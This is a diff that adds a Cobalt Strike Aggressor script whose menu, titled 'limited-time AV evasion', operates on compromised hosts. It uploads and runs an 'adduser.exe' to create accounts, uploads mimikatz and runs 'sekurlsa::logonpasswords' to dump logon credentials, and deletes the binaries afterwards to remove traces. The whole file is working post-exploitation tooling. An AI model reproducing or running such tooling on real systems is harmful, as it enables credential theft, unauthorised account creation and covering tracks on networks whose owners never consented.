@@ -1,0 +1,52 @@
+menu "限时免杀"{
+    menu "adduser"{
+        item "上传adduser"{
+            $bid = $1;
+            $dialog = dialog("上传adduser", %(UploadPath => "C:\\Users\\", bid => $bid), &adduser);
+            drow_text($dialog, "UploadPath",  "上传路径: ");
+            dbutton_action($dialog, "上传");
+            dialog_show($dialog);
+        }
+        sub adduser {
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("/scripts/BypassCxk/adduser.exe"));
+        }
+        item "运行adduser"{
+            $bid = $1['@'];
+            $dialog = dialog("运行adduser",%(exec => "adduser.exe", bid => $bid),&adduser_run);
+            drow_text($dialog, "exec", "Exec: ");
+            dbutton_action($dialog, "运行");
+            dialog_show($dialog);
+        }
+        sub adduser_run {
+            $exec = $3['exec'];
+            bshell($bid, "$exec");
+        }
+        item "删除adduser" {
+            $bid = $1['@'];
+            bshell($bid, " del /f /s /q adduser.exe");
+        }
+        
+    }
+    menu "mimikatz" {
+        item "上传mimikatz" {
+            $bid = $1;
+            $dialog = dialog("上传mimikatz", %(UploadPath => "C:\\Users\\", bid => $bid), &mimi);
+            drow_text($dialog, "UploadPath",  "上传路径: ");
+            dbutton_action($dialog, "上传");
+            dialog_show($dialog);   
+        }
+        sub mimi {
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("/scripts/BypassCxk/mimi.exe"));
+        }
+        item "logonpasswords" {
+            $bid = $1;
+            bshell($bid,"mimi.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit");
+        }
+        item "删除mimikatz" {
+            $bid = $1['@'];
+            bshell($bid, " taskkill -f /im mimi.exe & del /f /s /q mimi.exe");
+        }        
+    }
+}
